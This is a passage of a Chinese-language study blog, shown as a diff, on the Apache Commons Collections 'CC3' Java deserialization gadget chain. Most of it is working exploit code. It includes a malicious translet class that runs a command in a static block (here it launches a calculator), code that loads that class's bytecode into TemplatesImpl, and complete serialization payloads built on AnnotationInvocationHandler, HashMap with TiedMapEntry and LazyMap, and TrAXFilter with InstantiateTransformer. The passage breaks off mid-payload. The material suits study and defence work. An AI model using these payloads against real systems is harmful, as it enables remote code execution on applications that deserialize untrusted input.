class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    // 恶意代码放在静态代码块中</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 需要重写父类的两个方法</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行程序 test1 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test1 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化TemplatesImpl对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name不为空</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置值的操作重复，可以抽离成一个方法</span><br><span class="line">    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        Field declaredField = clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object, filed_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器。</p>
+<h3 id="利用链之-TrAXFilter-类"><a href="#利用链之-TrAXFilter-类" class="headerlink" title="利用链之 TrAXFilter 类"></a>利用链之 TrAXFilter 类</h3><p>TrAXFilter 的构造方法会调用 TemplatesImpl 的 newTransformer() 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而且还是个 public 方法，可惜的是 TrAXFilter 不能被序列化。</p>
+<h3 id="入口类-InstantiateTransformer"><a href="#入口类-InstantiateTransformer" class="headerlink" title="入口类 InstantiateTransformer"></a>入口类 InstantiateTransformer</h3><p>InstantiateTransformer 的 transform 能够实例化对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (input instanceof Class == false) &#123;</span><br><span class="line">            throw new FunctorException(</span><br><span class="line">                &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br><span class="line">                    + (input == null ? &quot;null object&quot; : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        return con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);</span><br><span class="line">    &#125; catch (InstantiationException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);</span><br><span class="line">    &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);</span><br><span class="line">    &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们可以直接用 InstantiateTransformer 来实例化 TrAXFilter 对象。</p>
+<h4 id="写个小程序验证一下-1"><a href="#写个小程序验证一下-1" class="headerlink" title="写个小程序验证一下"></a>写个小程序验证一下</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化TemplatesImpl对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name不为空</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过maven编译后target目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes和_tfactory不为空，由于还没有进行反序列化，这里先手动设置_tfactory的值</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 初始化InstantiateTransformer对象，利用它实例化TrAXFilter对象</span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置值的操作重复，可以抽离成一个方法</span><br><span class="line">    public static void setFieldValue(Object object, String field_name, Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        Field declaredField = clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object, filed_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h3><p>我们依然是选择用 InvokerTransformer 类的 transform 方法来执行 TemplatesImpl 的 newTransformer() 方法。但是反序列化的入口有多个选择，可以使用 AnnotationInvocationHandler 的 readObject ，或者 HashMap 的 readObject 。</p>
+<p>除了上述方法之外还可以用 TrAXFilter 类来调用 TemplatesImpl 的 newTransformer() 方法。</p>
+<h4 id="将-AnnotationInvocationHandler-作为入口类"><a href="#将-AnnotationInvocationHandler-作为入口类" class="headerlink" title="将 AnnotationInvocationHandler 作为入口类"></a>将 AnnotationInvocationHandler 作为入口类</h4><p>前面学 CC1 链的时候我们就是用 AnnotationInvocationHandler 的 readObject 方法来反序列化的，但是有 Java 版本限制。</p>
+<p>payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC1_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;test&quot;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,codes);</span><br><span class="line"></span><br><span class="line">        //利用 ChainedTransformer 执行 templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        // 新建一个 HashMap ，没什么意义，仅作为参数传入</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 反射获取 AnnotationInvocationHandler 的构造方法</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(true);</span><br><span class="line">        // 利用构造方法将 AnnotationInvocationHandler 对象的 memberValues 属性赋值为 LazyMap 对象</span><br><span class="line">        // memberValues 属性的 get 方法将会被 AnnotationInvocationHandler 的 invoke 方法调用</span><br><span class="line">        InvocationHandler h = (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        // 为了能够调用 h 的 invoke 方法，我们用 h 来构造一个代理对象，这样当代理对象的任意方法被调用时，h 的 invoke 方法都会被调用</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        // 再次利用构造方法将另一个 AnnotationInvocationHandler 对象的 memberValues 属性赋值为代理对象</span><br><span class="line">        // AnnotationInvocationHandler 的 readObject 方法中会调用 memberValues.entrySet() 方法，届时代理对象的 invoke 方法将被触发</span><br><span class="line">        Object o = annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;cc1_templatesImpl.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1_templatesImpl.bin&quot;));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="将-HashMap-作为入口类"><a href="#将-HashMap-作为入口类" class="headerlink" title="将 HashMap 作为入口类"></a>将 HashMap 作为入口类</h4><p>前面学 CC6 链时，我们便是将 HashMap 作为入口类，原因是 HashMap 的 readObject 方法会调用 key 的 hashCode 方法。</p>
+<p>之后的利用链 TiedMapEntry ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get() </span><br></pre></td></tr></table></figure>
+
+<p>所以将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象就好。</p>
+<p>payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;test&quot;);</span><br><span class="line">        // 这里需要用到恶意类的字节码文件，通过 maven 编译后 target 目录下有字节码文件</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\CC3链\\CC3\\target\\classes\\com\\miaoji\\Eval.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        // _bytecodes 不为空</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,codes);</span><br><span class="line"></span><br><span class="line">        //利用 ChainedTransformer 执行 templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null,null)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap ，没什么意义，仅作为参数传入</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        // 初始化利用链 LazyMap，LazyMap 的 get 方法将会调用 chainedTransformer 的 transform 方法</span><br><span class="line">        // 为了防止序列化时命令执行，这里先传入一个普通的 ConstantTransformer 对象</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 将 TiedMapEntry 的 map 属性赋值为 LazyMap 对象</span><br><span class="line">        // 利用链：TiedMapEntry#hashCode() -&gt; TiedMapEntry#getValue() -&gt; TiedMapEntry.map#get()</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 新建一个 HashMap 对象，将 TiedMapEntry 对象作为 key 传入，之后将会调用 TiedMapEntry#hashCode()</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        // 序列化时这里将会提前调用 TiedMapEntry#hashCode() ，导致 lazyMap::get()被调用，导致 lazyMap 的 key 属性被赋值</span><br><span class="line">        // 于是反序列化调用 lazyMap::get() 时无法进入判断，无法调用 transform 方法</span><br><span class="line">        map2.put(tiedMapEntry,&quot;test&quot;);</span><br><span class="line">        // 为了解决上述问题，HashMap 对象的 put 方法执行后需要去除 lazyMap 中的 key</span><br><span class="line">        lazyMap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 最后利用反射将 LazyMap 的 factory 对象修改为 chainedTransformer</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(&quot;cc6_templatesImpl.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws Exception &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(true);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc6_templatesImpl.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="TrAXFilter-InstantiateTransformer-代替-InvokerTransformer"><a href="#TrAXFilter-InstantiateTransformer-代替-InvokerTransformer" class="headerlink" title="TrAXFilter + InstantiateTransformer 代替 InvokerTransformer"></a>TrAXFilter + InstantiateTransformer 代替 InvokerTransformer</h4><p>利用 TrAXFilter 的构造方法调用 TemplatesImpl 的 newTransformer() 方法，就不需要使用 InvokerTransformer 了。入口类可以从上面两个中选一个。</p>
+<p>为了更加通用，这里选择将 HashMap 作为入口类，payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class TrAXFilter_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 初始化 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        // _name 不为空</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        // 初始化 InstantiateTransformer 对象，利用它实例化 TrAXFilter 对象</span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span><br><span class="line">        // 